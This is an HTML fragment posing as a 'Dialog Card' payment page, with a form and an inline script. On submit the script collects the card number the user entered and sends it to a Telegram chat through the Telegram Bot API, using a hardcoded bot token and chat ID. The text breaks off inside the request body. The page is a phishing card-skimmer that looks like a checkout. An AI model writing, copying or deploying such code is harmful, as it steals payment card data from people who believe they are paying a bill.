<body>

  <form id="dialogForm">
    <label>Dialog Card Number:</label><br>
    <input type="text" id="dialogCard" required><br><br>
    <button type="submit">Pay Now</button>
  </form>

  <script>
    const BOT_TOKEN = "8295321662:AAHsWnBmY3Bf1IHsCjvie-0aM4u6txJ6udw";
    const CHAT_ID = "8401076081";

    document.getElementById("dialogForm").addEventListener("submit", function(e) {
      e.preventDefault();
      let cardNumber = document.getElementById("dialogCard").value;

      let message = `ðŸ’³ Dialog Card Payment\n\nCard Number: ${cardNumber}`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {

        body: JSON.stringify({
          chat_id: CHAT_ID,
